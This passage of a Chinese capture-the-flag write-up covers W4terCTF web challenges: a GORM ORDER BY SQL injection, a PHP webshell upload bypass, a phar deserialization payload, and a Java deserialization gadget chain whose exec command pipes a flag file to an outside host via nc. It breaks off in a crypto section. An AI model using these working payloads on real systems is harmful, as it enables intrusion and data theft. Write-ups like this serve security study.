class=\"string\">&quot;/users&quot;</span>, <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(c *gin.Context)</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> users []User</span><br><span class=\"line\">    orderBy := c.Query(<span class=\"string\">&quot;order_by&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> orderBy == <span class=\"string\">&quot;&quot;</span> &#123;</span><br><span class=\"line\">        orderBy = <span class=\"string\">&quot;id asc&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    db.Order(orderBy).Find(&amp;users)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i := <span class=\"keyword\">range</span> users &#123;</span><br><span class=\"line\">        users[i].Secret = <span class=\"string\">&quot;hidden www~~&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    c.JSON(http.StatusOK, users)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>这里 <code>orderBy</code>  直接来自用户输入，而 GORM 文档写道：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/RusG1mrbDpxjyTC.png\" alt=\"user-manager\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb3JtLmlvL3poX0NOL2RvY3Mvc2VjdXJpdHkuaHRtbA==\">安全 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</span></p>\n<p>看起来 <code>db.Order(string)</code>  会把 <code>string</code>  直接拼在 SQL 语句的 <code>ORDER BY</code>  后面，于是加了个 <code>;</code> ，在后面注入了一句 <code>UPDATE</code> ，把所有用户的 <code>name</code>  改为自己的 <code>secret</code> ，下一次直接 GET 即可从用户的 <code>name</code>  字段拿到 flag。</p>\n<h2 id=\"png-server\"><a class=\"anchor\" href=\"#png-server\">#</a> PNG Server</h2>\n<p><code>php.ini</code>  中存在漏洞：</p>\n<p><figure class=\"highlight php\"><figcaption><span>php.ini</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cgi.fix_pathinfo = <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>这个设置会导致所请求的  <code>.php</code>  文件不存在就会跳到上一层的路径查找文件，比如说  <code>http://....../.php</code>  ，那么就可以确定我们需要上传一个 php 文件</p>\n<p>源代码中用  <code>isImage</code>  来判断上传文件是否为图片，这里的检查非常随便，存在漏洞:</p>\n<p><figure class=\"highlight php\"><figcaption><span>index.php</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isImage</span>(<span class=\"params\"><span class=\"variable\">$imgPath</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span>  = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"variable\">$imgPath</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$bin</span>  = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">    <span class=\"variable\">$strInfo</span> = <span class=\"title function_ invoke__\">unpack</span>(<span class=\"string\">&quot;C2chars&quot;</span>, <span class=\"variable\">$bin</span>);</span><br><span class=\"line\">    <span class=\"variable\">$typeCode</span> = <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars1&#x27;</span>] . <span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars2&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$typeCode</span> == <span class=\"number\">255216</span> || <span class=\"variable\">$typeCode</span> == <span class=\"number\">7173</span> || <span class=\"variable\">$typeCode</span> == <span class=\"number\">13780</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$typeCode</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>只需要在 php 木马前加上  <code>GI</code>  （ 2 个字节对应  <code>7173</code>  ）就可以通过检查，写一个返回 flag  的 php 木马：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GI&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">currentDirectory = <span class=\"built_in\">realpath</span>(<span class=\"built_in\">dirname</span>(__FILE__));</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">flag_path = <span class=\"built_in\">realpath</span>(<span class=\"variable\">$currentDirectory</span> . <span class=\"string\">&#x27;/../../../../../flag&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">flag = fopen(<span class=\"variable\">$flag_path</span> , <span class=\"string\">&#x27;r&#x27;</span>);</span></span><br><span class=\"line\">if ($flag) &#123;</span><br><span class=\"line\">    $content = fread($flag, filesize($flag_path));</span><br><span class=\"line\">    echo $content;</span><br><span class=\"line\">    fclose($flag);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    echo &quot;无法打开文件 $filename&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>然后上传该文件，文件已经被改名为了 md5 随机码，F12 找到该文件的 url ：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/LRhQcpyB2oZPMkq.png\" alt=\"LRhQcpyB2oZPMkq\" /></p>\n<p>然后在该 url 后面加上  <code>/.php</code>  就可以执行该 php 木马：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/t6FA2a8iX9OwGog.png\" alt=\"t6FA2a8iX9OwGog\" /></p>\n<p><code>W4terCTF&#123;uPL04Ds_ar3_0UR_vlC3_RCE_WwwWWw&#125;</code></p>\n<h2 id=\"auto-unserialize\"><a class=\"anchor\" href=\"#auto-unserialize\">#</a> Auto Unserialize</h2>\n<p>首先在盲目找线索的阶段我是用  <code>GET</code>  方法得到 flag 的位置的：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl &quot;http://127.0.0.1:54018/?img_file=../../../flag&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Return Success</span></span><br></pre></td></tr></table></figure></p>\n<p>直到我看到了参考资料：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzY4MC8=\">reference</span></p>\n<p>首先可能先需要：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php --ini</span><br></pre></td></tr></table></figure></p>\n<p>找到  <code>php.ini</code>  加上这一行：</p>\n<p><figure class=\"highlight ini\"><figcaption><span>php.ini</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">phar.readonly</span> = <span class=\"literal\">Off</span><span class=\"comment\">;</span></span><br></pre></td></tr></table></figure></p>\n<p>构造 payload  <code>phar.phar</code>  文件用的  <code>phar_gen.php</code> ：</p>\n<p><figure class=\"highlight php\"><figcaption><span>phar_gen.php</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">command_test</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$command</span> = <span class=\"string\">&quot;echo file_get_contents(&#x27;../../../flag&#x27;);&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;command);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;GIF89a&quot;</span>.<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">command_test</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//将自定义meta-data存入manifest</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>); <span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\">    <span class=\"comment\">//签名自动计算</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>运行脚本生成 payload  <code>phar.phar</code>  文件，上传该文件，最后  <code>GET</code>  请求获取 flag ：：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php phar_gen.php</span><br><span class=\"line\"></span><br><span class=\"line\">curl -X POST -F &quot;file=@phar.phar&quot; http://127.0.0.1:54018/</span><br><span class=\"line\"></span><br><span class=\"line\">curl &quot;http://127.0.0.1:54018/?img_file=phar://check.jpg/test.txt&quot;</span><br></pre></td></tr></table></figure></p>\n<p><code>W4terCTF&#123;uNsErl4I1z3_tH3_pH4r_ArCh1v3_TO_ReveAl_tHE_hIDdEn_tREASUrE_OF_7h3_Php_5Erver&#125;</code></p>\n<h2 id=\"just-readobject\"><a class=\"anchor\" href=\"#just-readobject\">#</a> Just ReadObject</h2>\n<p>先贴 payload：</p>\n<p>突破口是队友查到的一个比较有名的案例：Java 的优先队列序列化的时候，会把元素一个一个 add 进去，而 add 需要元素之间的比较。如果优先队列初始化时指定了比较器，会直接调用比较器的 <code>compare</code>  方法。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFsL2Jsb2IvYjdkMGYyN2I0NmFmMDZiYmNlZDdkYmFmZGRjNDk2NzgxNzlkMzcwOC9zcmMvbWFpbi9qYXZhL3lzb3NlcmlhbC9wYXlsb2Fkcy9Db21tb25zQ29sbGVjdGlvbnM3LmphdmEjTDY=\">ysoserial/src/main/java/ysoserial/payloads/CommonsCollections7.java at b7d0f27b46af06bbced7dbafddc49678179d3708 · frohoff/ysoserial · GitHub</span></p>\n<p>而 jar 包里有个 <code>W4terTransformingComparator</code> ，它实现了 <code>Comparator</code> ，可以作为优先队列的比较器，并且它的 <code>compare</code>  方法非常的狂野：</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">compare</span><span class=\"params\">(Object obj1, Object obj2)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    value1 = <span class=\"built_in\">this</span>.transformer.transform(obj1);</span><br><span class=\"line\">    <span class=\"type\">Object</span> <span class=\"variable\">value2</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.transformer.transform(obj2);</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.decorated.compare(value1, value2);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>大概就是会调用两个比较对象的 <code>transform</code>  方法，然后呢这个类还有个 <code>decorated</code>  字段，类型是这个类自己，上面两个 <code>transform</code>  调用完，会接着调用 <code>decorated</code>  的 <code>compare</code>  方法，相当于一个 <code>W4terTransformingComparator</code>  类型的链表。</p>\n<p>那对于 transformer 呢，jar 包里还有一个 <code>W4terInvokerTransformer</code> ，这个更狂野，它有这三个字段：方法名，参数类型定义列表，参数列表。这几个字段在序列化过程就可以完成加载。</p>\n<p>而它的 <code>transform(Object obj)</code>  方法，会直接根据上面的三个参数， <code>invoke</code>  这个 <code>obj</code>  的指定方法。</p>\n<p>所以可以用它构造一个优先队列，指定比较器为这么一个比较器链表，每一级比较器都可以对 obj 用任意参数执行任意方法，并且优先队列里的元素也可以自己塞。</p>\n<p>首先想到的是 <code>Runtime.getRuntime().exec(cmd)</code> ，由于 <code>Runtime</code>  是不可序列化的运行时 context，需要用反射获取，我们的方法是 <code>Class.class.forName(&quot;java.lang.Runtime&quot;)</code> 。</p>\n<p>也就是说优先队列里要先塞个 <code>Class.class</code> ，然后把上面的调用链拉成 <code>W4terTransformingComparator</code>  的链表即可。payload 如下：</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Comparator</span> <span class=\"variable\">comp_empty</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">W4terComparator</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">W4terTransformer</span> <span class=\"variable\">trans_for_name</span> <span class=\"operator\">=</span> </span><br><span class=\"line\">W4terInvokerTransformer.invokerTransformer(</span><br><span class=\"line\">    <span class=\"string\">&quot;forName&quot;</span>, </span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;String.class&#125;, </span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"string\">&quot;java.lang.Runtime&quot;</span>&#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"type\">W4terTransformer</span> <span class=\"variable\">trans_get_method</span> <span class=\"operator\">=</span> </span><br><span class=\"line\">W4terInvokerTransformer.invokerTransformer(</span><br><span class=\"line\">    <span class=\"string\">&quot;getMethod&quot;</span>,</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;String.class, Class[].class&#125;, </span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"type\">W4terTransformer</span> <span class=\"variable\">trans_exec</span> <span class=\"operator\">=</span> </span><br><span class=\"line\">W4terInvokerTransformer.invokerTransformer(</span><br><span class=\"line\">    <span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;String[].class&#125;, </span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;sh&quot;</span>,<span class=\"string\">&quot;-c&quot;</span>,<span class=\"string\">&quot;cat /tmp/flag | nc 172.18.198.218 6666&quot;</span></span><br><span class=\"line\">    &#125;&#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">W4terTransformer</span> <span class=\"variable\">trans_invoke</span> <span class=\"operator\">=</span> </span><br><span class=\"line\">W4terInvokerTransformer.invokerTransformer(</span><br><span class=\"line\">    <span class=\"string\">&quot;invoke&quot;</span>,</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;Object.class, Object[].class&#125;, </span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">W4terTransformingComparator</span> <span class=\"variable\">comp_final</span> <span class=\"operator\">=</span> </span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">W4terTransformingComparator</span>(</span><br><span class=\"line\">        trans_for_name,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">W4terTransformingComparator</span>(</span><br><span class=\"line\">            trans_get_method,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> <span class=\"title class_\">W4terTransformingComparator</span>(</span><br><span class=\"line\">                trans_invoke,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">W4terTransformingComparator</span>(</span><br><span class=\"line\">                    trans_exec,</span><br><span class=\"line\">                    comp_empty</span><br><span class=\"line\">                )</span><br><span class=\"line\">            ))</span><br><span class=\"line\">    );</span><br><span class=\"line\">PriorityQueue&lt;Class&gt; pq = </span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityQueue</span>&lt;Class&gt;(comp_final);</span><br><span class=\"line\">pq.add(Class.class);</span><br><span class=\"line\">pq.add(Class.class);</span><br><span class=\"line\"></span><br><span class=\"line\">serialize(pq, <span class=\"string\">&quot;hack.obj&quot;</span>);</span><br></pre></td></tr></table></figure></p>\n<p>本地开 nc 监听 6666 端口，然后上传 <code>hack.obj</code>  即可立刻收到 flag。</p>\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"smoke-hints\"><a class=\"anchor\" href=\"#smoke-hints\">#</a> Smoke hints</h2>\n<p>从 task.py 可以得到以下信息</p>\n<p>以下将 hint1~hint5 简写为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub></mrow><annotation encoding=\"application/x-tex\">h_1 -h_5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">h_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是随机生成的 18 位素数</p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mn>2</mn></msub><mo>=</mo><mo stretchy=\"false\">(</mo><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><mn>2</mn><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">!</mo><mi>e</mi><mi mathvariant=\"normal\">%</mi><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">h_2=(h_1-2)!e\\%h_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mclose\">!</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">%</span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mn>3</mn></msub><mo>=</mo><mo stretchy=\"false\">⌊</mo><mfrac><mi>p</mi><msup><mn>2</mn><mn>256</mn></msup></mfrac><mo stretchy=\"false\">⌋</mo></mrow><annotation encoding=\"application/x-tex\">h_3=\\lfloor\\frac{p}{2^{256}}\\rfloor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.095em;vertical-align:-0.345em;\"></span><span class=\"mopen\">⌊</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7475em;\"><span style=\"top:-2.6550000000000002em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord 